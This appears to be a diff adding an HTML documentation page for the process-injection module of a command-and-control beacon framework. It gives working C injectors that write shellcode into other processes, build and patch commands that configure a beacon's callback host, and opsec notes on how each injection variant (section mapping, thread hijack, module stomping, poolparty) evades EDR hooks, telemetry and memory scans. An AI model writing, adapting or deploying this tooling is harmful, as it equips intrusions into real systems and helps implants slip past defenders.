@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Process Inject Kit</title>
+<link rel="stylesheet" href="style.css">
+</head><body>
+<nav class="crumbs"><a href="index.html">Home</a> &raquo; Process Inject Kit</nav>
+
+<h1>Process Inject Kit</h1>
+
+<p>Process Inject Kit allows replacing the beacon's built-in shellcode injection logic with a custom
+PIC blob. The beacon invokes injection for any operation that requires running code in another process:
+<code>inject</code>, <code>inject_dll</code>, <code>spawnto</code>, and internal tasks (fork &amp; run).</p>
+
+<ul class="toc">
+<li><a href="#arch">Architecture</a></li>
+<li><a href="#api">API (InjectCtx)</a></li>
+<li><a href="#contract">Injector Contract</a></li>
+<li><a href="#build">Build</a></li>
+<li><a href="#variants">Ready-to-use Variants</a></li>
+<li><a href="#writing">Writing a Custom Injector</a></li>
+<li><a href="#x86-pitfalls">x86 Pitfalls</a></li>
+<li><a href="#example-default">Example: Default Injector</a></li>
+<li><a href="#example-section-map">Example: NtMapViewOfSection</a></li>
+<li><a href="#integration">Integration with the Beacon</a></li>
+</ul>
+
+<!-- ====================================================================== -->
+<h2 id="arch">Architecture</h2>
+
+<p>The beacon PE has special sections for injection:</p>
+
+<table>
+<tr><th>Section</th><th>Contents</th><th>Encrypted during sleep?</th></tr>
+<tr><td><code>.text</code></td><td>Beacon code (tasking, commands, crypto)</td><td>Yes</td></tr>
+<tr><td><code>.inject</code></td><td>kit_inject code (dispatcher, default_inject, resolve)</td><td>No</td></tr>
+<tr><td><code>.injkit</code></td><td>Slot for the custom shellcode (16384 bytes)</td><td>No</td></tr>
+<tr><td><code>.co2cfg</code></td><td>BeaconState (configuration)</td><td>No</td></tr>
+</table>
+
+<h3>Execution Flow</h3>
+<pre>
+cmd_inject() / cmd_inject_dll() / cmd_spawnto()
+  +-- kit_inject(target, pid, method, shellcode, ...)  [.inject section]
+       |-- resolve_inject_ctx()        NtAllocate, NtWrite, NtProtect, NtCreateThreadEx...
+       |-- IF .injkit patched:
+       |       [4-byte EP offset] -> call user inject blob
+       |   ELSE:
+       |       call default_inject() (built-in alloc+write+protect+thread)
+       +-- Return result + handles to caller
+</pre>
+
+<h3>Blob Format (.injkit)</h3>
+<p>The blob is the extracted <code>.text</code> section of the compiled injector with a 4-byte header:</p>
+<pre>
+[uint32_t LE: offset from blob start to entry point]
+[... entire .text section code ...]
+</pre>
+<p>Since the linker uses <code>/MERGE:.rdata=.text</code>, all data
+(strings, tables) is merged into <code>.text</code> before the code. The entry point is usually
+not at zero offset — the header specifies the exact offset.</p>
+
+<div class="note">
+Maximum blob size: <b>16368 bytes</b> (16384 - 16 bytes for the sentinel).
+If the compiled injector exceeds this size, artifact-gen will refuse to patch.
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="api">API (InjectCtx)</h2>
+
+<p>The beacon fills the <code>InjectCtx</code> structure and passes a pointer
+to it into the injector. Definition in <code>kit/processinject/process_inject_api.h</code>:</p>
+
+<h3>Injection Methods</h3>
+<pre>
+#define INJECT_METHOD_THREAD    0   // CreateThread in the remote process
+#define INJECT_METHOD_APC       1   // QueueApcThread to target threads
+#define INJECT_METHOD_SPAWN     2   // Create a sacrificial process + inject
+</pre>
+
+<h3>Return Codes</h3>
+<pre>
+#define INJECT_OK               0   // Success
+#define INJECT_ERR_ALLOC        1   // VirtualAllocEx failed
+#define INJECT_ERR_WRITE        2   // WriteProcessMemory failed
+#define INJECT_ERR_PROTECT      3   // VirtualProtect failed
+#define INJECT_ERR_THREAD       4   // Thread/APC creation failed
+#define INJECT_ERR_PROCESS      5   // Target process inaccessible
+#define INJECT_ERR_RESOLVE      6   // Function not found in ntdll/kernel32
+#define INJECT_ERR_OTHER       99
+</pre>
+
+<h3>InjectCtx</h3>
+<pre>
+typedef struct InjectCtx {
+    // ---- Target (filled by the beacon) ----
+    HANDLE      target_process;     // HANDLE with full access (or NULL for spawn)
+    DWORD       target_pid;         // target PID (0 for spawn)
+    uint32_t    method_hint;        // INJECT_METHOD_* (hint, not obligation)
+
+    // ---- Payload ----
+    const uint8_t*  payload;        // Shellcode (in beacon memory)
+    uint32_t        payload_len;    // Shellcode size
+
+    // ---- Output fields (filled by custom code) ----
+    HANDLE      out_thread;         // Created thread (beacon waits/closes)
+    HANDLE      out_process;        // Created process (SPAWN only)
+    void*       out_remote_base;    // Allocation base address (for cleanup)
+
+    // ---- NT functions (from ntdll.dll, resolved by the beacon) ----
+    NTSTATUS (*NtAllocateVirtualMemory)(...);
+    NTSTATUS (*NtWriteVirtualMemory)(...);
+    NTSTATUS (*NtProtectVirtualMemory)(...);
+    NTSTATUS (*NtCreateThreadEx)(...);
+    NTSTATUS (*NtQueueApcThread)(...);
+    NTSTATUS (*NtOpenProcess)(...);
+    NTSTATUS (*NtCreateSection)(...);
+    NTSTATUS (*NtMapViewOfSection)(...);
+    NTSTATUS (*NtUnmapViewOfSection)(...);
+    NTSTATUS (*NtClose)(...);
+    NTSTATUS (*NtResumeThread)(...);
+    NTSTATUS (*NtSuspendThread)(...);
+    NTSTATUS (*NtGetContextThread)(...);
+    NTSTATUS (*NtSetContextThread)(...);
+
+    // ---- Kernel32 (for CreateProcess in spawn methods) ----
+    BOOL (*CreateProcessW)(...);
+    BOOL (*TerminateProcess)(...);
+    void* (*CreateToolhelp32Snapshot)(...);
+    BOOL  (*Thread32First)(...);
+    BOOL  (*Thread32Next)(...);
+    HANDLE (*OpenThread)(...);
+    BOOL  (*CloseHandle)(...);
+
+    // ---- Auxiliary ----
+    HANDLE      self_process;       // (HANDLE)-1
+    void*       ntdll_base;         // ntdll.dll base
+    void*       kernel32_base;      // kernel32.dll base
+
+    // ---- Spawn config ----
+    const uint16_t* spawn_to;       // Path to the sacrificial process (UTF-16LE)
+    uint32_t        spawn_to_len;   // Length in WCHARs (including null)
+} InjectCtx;
+</pre>
+
+<h3>Field Descriptions</h3>
+<table>
+<tr><th>Field</th><th>Description</th></tr>
+<tr><td><code>target_process</code></td>
+    <td>HANDLE to the target process with <code>PROCESS_ALL_ACCESS</code>.
+    For SPAWN = NULL (the injector creates the process itself).</td></tr>
+<tr><td><code>target_pid</code></td>
+    <td>Target PID. For APC used when enumerating threads via Toolhelp32.</td></tr>
+<tr><td><code>method_hint</code></td>
+    <td>Hint from the beacon — which method is preferred. The injector MAY ignore it and use its own.</td></tr>
+<tr><td><code>payload / payload_len</code></td>
+    <td>Shellcode to inject. Located in beacon memory (not the remote process).</td></tr>
+<tr><td><code>out_thread</code></td>
+    <td><b>Must be filled</b> on success: HANDLE to the created thread. The beacon waits for it to finish.</td></tr>
+<tr><td><code>out_process</code></td>
+    <td>Fill for SPAWN: HANDLE to the sacrificial process. The beacon will kill it after the thread exits.</td></tr>
+<tr><td><code>out_remote_base</code></td>
+    <td>Base address of the allocation in the remote process (for optional cleanup).</td></tr>
+<tr><td><code>Nt*</code> pointers</td>
+    <td>Ready-to-use pointers to ntdll functions. No need to resolve them yourself.</td></tr>
+<tr><td><code>CreateProcessW</code></td>
+    <td>Pointer to kernel32!CreateProcessW. For spawn methods.</td></tr>
+<tr><td><code>spawn_to</code></td>
+    <td>Path to the sacrificial process from the beacon's configuration (UTF-16LE). May be NULL — the injector uses notepad.exe by default.</td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="contract">Injector Contract</h2>
+
+<p>The custom code <b>must</b>:</p>
+
+<ol>
+<li><b>Allocate memory</b> in the target process (RW) via <code>NtAllocateVirtualMemory</code>
+    or <code>NtCreateSection + NtMapViewOfSection</code>.</li>
+<li><b>Write the payload</b> via <code>NtWriteVirtualMemory</code> or shared section mapping.</li>
+<li><b>Change protection to RX</b> — <code>NtProtectVirtualMemory(..., PAGE_EXECUTE_READ, ...)</code>.</li>
+<li><b>Start execution</b> — <code>NtCreateThreadEx</code>, <code>NtQueueApcThread</code>,
+    thread hijack (<code>NtSuspendThread + NtSetContextThread + NtResumeThread</code>), or another method.</li>
+<li><b>Fill output fields</b>: <code>out_thread</code> (required), <code>out_process</code> (for spawn), <code>out_remote_base</code>.</li>
+<li><b>Return 0</b> on success or an <code>INJECT_ERR_*</code> error code.</li>
+</ol>
+
+<div class="warning">
+<b>FORBIDDEN</b> to call beacon functions — its <code>.text</code> may be encrypted
+(if the beacon was sleeping before the call). All required functions are provided via <code>InjectCtx</code>.
+</div>
+
+<h3>PIC Code Rules</h3>
+<ul>
+<li>No global variables or static data.</li>
+<li>No string literals — only stack-allocated arrays.</li>
+<li>No CRT (malloc, printf, memcpy).</li>
+<li>Entry point <code>process_inject_entry</code> must be the <b>first defined function</b> in the file.</li>
+<li>All helper functions are defined <b>after</b> the entry point.</li>
+<li>Calling convention: <code>__cdecl</code>.</li>
+<li>Prototype: <code>uint32_t __cdecl process_inject_entry(InjectCtx* ctx)</code>.</li>
+<li>Maximum size: 16368 bytes.</li>
+</ul>
+
+<!-- ====================================================================== -->
+<h2 id="build">Build</h2>
+
+<h3>Automated (build_all.bat)</h3>
+<pre>
+cd kit\processinject
+build_all.bat
+</pre>
+<p>The script compiles all variants from <code>masks\</code> + <code>default_inject.c</code>
+for x64 and x86. Output: <code>bin\&lt;name&gt;.x64.bin</code> and <code>bin\&lt;name&gt;.x86.bin</code>.</p>
+
+<h3>Manual Build of a Single Injector</h3>
+<pre>
+REM x64:
+cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /I"kit\processinject" ^
+    /Fo"inject.obj" my_inject.c
+link.exe /nologo /NODEFAULTLIB /ENTRY:process_inject_entry ^
+    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
+    /OUT:inject.exe inject.obj
+python kit\extract_section.py inject.exe .text inject.x64.bin
+
+REM x86 (add /arch:IA32 and link x86_helpers.obj):
+cl.exe /nologo /c /O2 /GS- /Zl /W3 /TC /arch:IA32 /I"kit\processinject" ^
+    /Fo"inject.obj" my_inject.c
+cl.exe /nologo /c /O2 /GS- /Zl /TC /Fo"helpers.obj" ^
+    kit\x86_helpers.c
+link.exe /nologo /NODEFAULTLIB /ENTRY:process_inject_entry ^
+    /SUBSYSTEM:CONSOLE /SECTION:.text,ER /MERGE:.rdata=.text ^
+    /OUT:inject.exe inject.obj helpers.obj
+python kit\extract_section.py inject.exe .text inject.x86.bin
+</pre>
+
+<h3>Applying an Injector to the Beacon</h3>
+<pre>
+artifact-gen --input beacon64.exe --inject bin\section_map.x64.bin ^
+    --host 10.0.0.5 --port 443 --key ... --out patched.exe
+</pre>
+
+<p>Can be combined with a sleep mask:</p>
+<pre>
+artifact-gen --input beacon64.exe ^
+    --mask  kit\sleepmask\bin\chacha_sleep.x64.bin ^
+    --inject kit\processinject\bin\section_map.x64.bin ^
+    --host 10.0.0.5 --port 443 --key ... --out patched.exe
+</pre>
+
+<h3>Compiler Flags</h3>
+<table>
+<tr><th>Flag</th><th>Purpose</th></tr>
+<tr><td><code>/O2</code></td><td>Optimize for speed</td></tr>
+<tr><td><code>/GS-</code></td><td>Disable stack cookies</td></tr>
+<tr><td><code>/Zl</code></td><td>Do not reference default libraries</td></tr>
+<tr><td><code>/TC</code></td><td>Compile as C</td></tr>
+<tr><td><code>/arch:IA32</code></td><td><b>x86 only!</b> Disables SSE</td></tr>
+<tr><td><code>/MERGE:.rdata=.text</code></td><td>Merge .rdata into .text (single blob)</td></tr>
+<tr><td><code>/ENTRY:process_inject_entry</code></td><td>PE entry point</td></tr>
+<tr><td><code>/NODEFAULTLIB</code></td><td>No CRT</td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="variants">Ready-to-use Variants</h2>
+
+<table>
+<tr><th>Injector</th><th>Directory</th><th>Method</th><th>Notes</th></tr>
+<tr><td><b>default</b></td>
+    <td><code>default_inject.c</code></td>
+    <td>Alloc + Write + Protect + NtCreateThreadEx</td>
+    <td>Standard, minimal size. Supports all three hints.</td></tr>
+<tr><td><b>section_map</b></td>
+    <td><code>masks/section_map/</code></td>
+    <td>NtCreateSection + NtMapViewOfSection</td>
+    <td>No NtWriteVirtualMemory — payload via shared mapping. Bypasses hooks on WriteVM.</td></tr>
+<tr><td><b>thread_hijack</b></td>
+    <td><code>masks/thread_hijack/</code></td>
+    <td>Suspend + SetContext + Resume</td>
+    <td>No new thread created — hijacks an existing one. Less visible to EDR.</td></tr>
+<tr><td><b>early_bird</b></td>
+    <td><code>masks/early_bird/</code></td>
+    <td>CreateProcess(SUSPENDED) + QueueApcThread(main thread)</td>
+    <td>APC to main thread before DLL initialization. Bypasses userland hooks.</td></tr>
+<tr><td><b>apc_ex2</b></td>
+    <td><code>masks/apc_ex2/</code></td>
+    <td>NtQueueApcThreadEx2 (alertable thread)</td>
+    <td>Does not require a suspended thread. Windows 10 1809+.</td></tr>
+<tr><td><b>phantom_hollow</b></td>
+    <td><code>masks/phantom_hollow/</code></td>
+    <td>Phantom DLL hollowing</td>
+    <td>Maps a DLL from a TxF transaction, overwrites the section. Looks like a legitimate DLL.</td></tr>
+<tr><td><b>module_stomp</b></td>
+    <td><code>masks/module_stomp/</code></td>
+    <td>Module stomping</td>
+    <td>Overwrites the .text section of a loaded DLL. Injection appears as a call in a signed module.</td></tr>
+<tr><td><b>poolparty</b></td>
+    <td><code>masks/poolparty/</code></td>
+    <td>Thread pool work item injection</td>
+    <td>Inserts a work item into the target's thread pool I/O completion port. Windows 10+.</td></tr>
+</table>
+
+<div class="opsec">
+<b>section_map</b> — bypasses inline hooks on NtWriteVirtualMemory (payload via shared mapping).<br>
+<b>thread_hijack</b> — no new thread, less ETW telemetry.<br>
+<b>phantom_hollow</b> — allocation is disguised as a legitimate DLL (clean memory scan).<br>
+<b>module_stomp</b> — RX pages belong to a signed module (bypasses ATP/VAD scan).<br>
+<b>poolparty</b> — no APC/thread creation syscall, bypasses most EDR hooks.
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="writing">Writing a Custom Injector</h2>
+
+<h3>Template</h3>
+<pre>
+#include "process_inject_api.h"
+
+// Forward declarations (helpers AFTER entry point).
+static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp);
+
+// ---- ENTRY POINT (must be the FIRST function in the file) ----
+uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
+    // 1. Get a handle to the process (or create one for SPAWN)
+    HANDLE hp = ctx-&gt;target_process;
+    if (!hp) return INJECT_ERR_PROCESS;
+
+    // 2. Write payload into the target process
+    void* remote = alloc_write_protect(ctx, hp);
+    if (!remote) return INJECT_ERR_ALLOC;
+    ctx-&gt;out_remote_base = remote;
+
+    // 3. Start execution
+    HANDLE hth = NULL;
+    NTSTATUS ns = ctx-&gt;NtCreateThreadEx(
+        &amp;hth, 0x1FFFFF, NULL, hp, remote, NULL, 0, 0, 0, 0, NULL);
+    if (ns &lt; 0 || !hth) return INJECT_ERR_THREAD;
+
+    ctx-&gt;out_thread = hth;
+    return INJECT_OK;
+}
+
+// ---- Helper functions (AFTER entry point) ----
+static void* alloc_write_protect(InjectCtx* ctx, HANDLE hp) {
+    PVOID base = NULL;
+    SIZE_T sz = (SIZE_T)ctx-&gt;payload_len;
+
+    NTSTATUS ns = ctx-&gt;NtAllocateVirtualMemory(
+        hp, &amp;base, 0, &amp;sz, 0x3000, 0x04);
+    if (ns &lt; 0 || !base) return NULL;
+
+    SIZE_T written = 0;
+    ctx-&gt;NtWriteVirtualMemory(hp, base, (PVOID)ctx-&gt;payload,
+                               (SIZE_T)ctx-&gt;payload_len, &amp;written);
+
+    PVOID pb = base; SIZE_T ps = sz; ULONG old = 0;
+    ctx-&gt;NtProtectVirtualMemory(hp, &amp;pb, &amp;ps, 0x20, &amp;old);
+    return base;
+}
+</pre>
+
+<h3>Resolving Additional NT Functions</h3>
+<p>If functions not included in <code>InjectCtx</code> are needed, they can be obtained by
+parsing the export directory at <code>ctx-&gt;ntdll_base</code> or <code>ctx-&gt;kernel32_base</code>:</p>
+
+<pre>
+// Stack strings (PIC!)
+char s[] = {'N','t','C','r','e','a','t','e',
+            'T','r','a','n','s','a','c','t','i','o','n',0};
+void* fn = pic_get_proc(ctx-&gt;ntdll_base, s);
+</pre>
+
+<!-- ====================================================================== -->
+<h2 id="x86-pitfalls">x86 Pitfalls</h2>
+
+<p>Same issues as for Sleep Mask Kit (see <a href="sleepmask-kit.html#x86-pitfalls">details</a>):</p>
+
+<table>
+<tr><th>Problem</th><th>Solution</th></tr>
+<tr><td>String literals with absolute addresses</td>
+    <td>All strings as <code>char s[] = {'.',0};</code> on the stack</td></tr>
+<tr><td>SSE instructions (<code>movaps [abs]</code>)</td>
+    <td>Compile with <code>/arch:IA32</code></td></tr>
+<tr><td><code>__allmul</code> / <code>__aullshr</code></td>
+    <td>Link with <code>x86_helpers.obj</code></td></tr>
+<tr><td>THREADENTRY32 sizes</td>
+    <td>Define the structure inline (sizeof matches on x86/x64)</td></tr>
+</table>
+
+<!-- ====================================================================== -->
+<h2 id="example-default">Example: Default Injector (NtCreateThreadEx)</h2>
+
+<p>File <code>default_inject.c</code> — the reference implementation supporting all three methods:</p>
+<pre>
+uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
+    switch (ctx-&gt;method_hint) {
+    case INJECT_METHOD_APC:   return do_apc(ctx);
+    case INJECT_METHOD_SPAWN: return do_spawn(ctx);
+    default:                  return do_thread(ctx);
+    }
+}
+
+static uint32_t do_thread(InjectCtx* ctx) {
+    void* rsc = alloc_write_protect(ctx, ctx-&gt;target_process);
+    if (!rsc) return INJECT_ERR_ALLOC;
+    ctx-&gt;out_remote_base = rsc;
+
+    HANDLE hth = NULL;
+    NTSTATUS ns = ctx-&gt;NtCreateThreadEx(
+        &amp;hth, 0x1FFFFF, NULL, ctx-&gt;target_process,
+        rsc, NULL, 0, 0, 0, 0, NULL);
+    if (ns &lt; 0 || !hth) return INJECT_ERR_THREAD;
+    ctx-&gt;out_thread = hth;
+    return INJECT_OK;
+}
+</pre>
+
+<!-- ====================================================================== -->
+<h2 id="example-section-map">Example: NtMapViewOfSection (without WriteProcessMemory)</h2>
+
+<p>File <code>masks/section_map/mask.c</code> — injection via shared section:</p>
+<pre>
+uint32_t __cdecl process_inject_entry(InjectCtx* ctx) {
+    // 1. NtCreateSection (size = payload_len, PAGE_EXECUTE_READWRITE)
+    HANDLE hSec = NULL;
+    LARGE_INTEGER sec_sz; sec_sz.QuadPart = ctx-&gt;payload_len;
+    ctx-&gt;NtCreateSection(&amp;hSec, 0xF001F, NULL, &amp;sec_sz, 0x40, 0x8000000, NULL);
+
+    // 2. Map view into SELF (RW) — copy payload
+    PVOID local_view = NULL; SIZE_T view_sz = 0;
+    ctx-&gt;NtMapViewOfSection(hSec, ctx-&gt;self_process,
+        &amp;local_view, 0, 0, NULL, &amp;view_sz, 2, 0, 0x04);
+    for (uint32_t i = 0; i &lt; ctx-&gt;payload_len; ++i)
+        ((uint8_t*)local_view)[i] = ctx-&gt;payload[i];
+
+    // 3. Map view into TARGET (RX) — same section, different protection
+    PVOID remote_view = NULL; view_sz = 0;
+    ctx-&gt;NtMapViewOfSection(hSec, ctx-&gt;target_process,
+        &amp;remote_view, 0, 0, NULL, &amp;view_sz, 2, 0, 0x20);
+
+    // 4. Unmap local, close section
+    ctx-&gt;NtUnmapViewOfSection(ctx-&gt;self_process, local_view);
+    ctx-&gt;NtClose(hSec);
+
+    // 5. Create thread at remote_view
+    HANDLE hth = NULL;
+    ctx-&gt;NtCreateThreadEx(&amp;hth, 0x1FFFFF, NULL,
+        ctx-&gt;target_process, remote_view, NULL, 0, 0, 0, 0, NULL);
+    ctx-&gt;out_thread = hth;
+    ctx-&gt;out_remote_base = remote_view;
+    return hth ? INJECT_OK : INJECT_ERR_THREAD;
+}
+</pre>
+
+<div class="opsec">
+Advantage: <code>NtWriteVirtualMemory</code> is not called — the payload reaches the target
+via shared memory mapping. Most EDR hooks on WriteProcessMemory do not trigger.
+</div>
+
+<!-- ====================================================================== -->
+<h2 id="integration">Integration with the Beacon</h2>
+
+<h3>How the Beacon Calls the Injector</h3>
+<ol>
+<li>A beacon command (inject, inject_dll, spawnto) calls <code>kit_inject()</code> from the <code>.inject</code> section.</li>
+<li><code>kit_inject()</code> fills <code>InjectCtx</code>: target process, payload, method.</li>
+<li>Resolves all NT/Kernel32 functions via GetProcAddress (stack strings).</li>
+<li>Checks the <code>.injkit</code> section:
+    <ul>
+    <li>If it contains the sentinel <code>CO2H_INJKIT__v1</code> — calls the built-in <code>default_inject()</code>.</li>
+    <li>If the sentinel is overwritten — reads the 4-byte EP offset,
+        jumps to <code>g_injkit_slot + offset</code>.</li>
+    </ul></li>
+<li>Receives the result (HANDLEs) and passes them to the calling command.</li>
+</ol>
+
+<h3>Commands That Use Process Inject Kit</h3>
+<table>
+<tr><th>Command</th><th>Description</th><th>Default Method</th></tr>
+<tr><td><code>inject &lt;pid&gt; &lt;shellcode&gt;</code></td>
+    <td>Inject shellcode into an existing process</td>
+    <td>THREAD</td></tr>
+<tr><td><code>inject_apc &lt;pid&gt; &lt;shellcode&gt;</code></td>
+    <td>Inject via APC</td>
+    <td>APC</td></tr>
+<tr><td><code>spawnto &lt;shellcode&gt;</code></td>
+    <td>Fork &amp; run: create a sacrificial process</td>
+    <td>SPAWN</td></tr>
+<tr><td><code>inject_dll &lt;pid&gt; &lt;dll&gt;</code></td>
+    <td>Reflective DLL injection</td>
+    <td>THREAD</td></tr>
+<tr><td><code>inject_dll &lt;dll&gt;</code> (no pid)</td>
+    <td>Fork &amp; run with DLL</td>
+    <td>SPAWN</td></tr>
+</table>
+
+<h3>Artifact Generation via GUI</h3>
+<p>In the artifact generation dialog (Generate Artifact button):</p>
+<ol>
+<li>Select <b>Inject Kit</b> — click Browse, point to the <code>.bin</code> file from <code>kit/processinject/bin/</code>.</li>
+<li>Can be combined with Sleep Mask — both are patched simultaneously.</li>
+<li>The Clear button removes the injector (the built-in one will be used).</li>
+</ol>
+
+<h3>.injkit Section — Technical Details</h3>
+<ul>
+<li>Section size: 16384 bytes (0x4000).</li>
+<li>Characteristics: <code>IMAGE_SCN_CNT_INITIALIZED_DATA | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ</code>.</li>
+<li>The variable <code>g_injkit_slot</code> is declared as <code>volatile</code> — prevents compiler optimization (MSVC with <code>/O2</code> may substitute compile-time constants instead of actual reads).</li>
+<li>Not encrypted during sleep (the sleep mask only encrypts <code>.text</code> and <code>.rdata</code>).</li>
+<li>artifact-gen locates the section by name in the PE section table and overwrites from the beginning.</li>
+</ul>
+
+<h3>kit/processinject/ Directory Structure</h3>
+<pre>
+kit/processinject/
+  process_inject_api.h     API header (include in injector)
+  default_inject.c         Reference injector (NtCreateThreadEx)
+  build_all.bat            Build all variants (x64 + x86)
+  masks/
+    section_map/mask.c     Shared section mapping (no WriteVM)
+    thread_hijack/mask.c   Thread hijack (SetContext)
+    early_bird/mask.c      APC into suspended process main thread
+    apc_ex2/mask.c         NtQueueApcThreadEx2 (Win10 1809+)
+    phantom_hollow/mask.c  DLL hollowing via TxF
+    module_stomp/mask.c    Module stomping (.text overwrite)
+    poolparty/mask.c       Thread pool work item injection
+  bin/                     Build output (.bin files)
+
+kit/
+  extract_section.py       Shared script for extracting .text from PE
+  x86_helpers.c            __allmul, __allshr for x86 (no-CRT)
+</pre>
+
+</body></html>
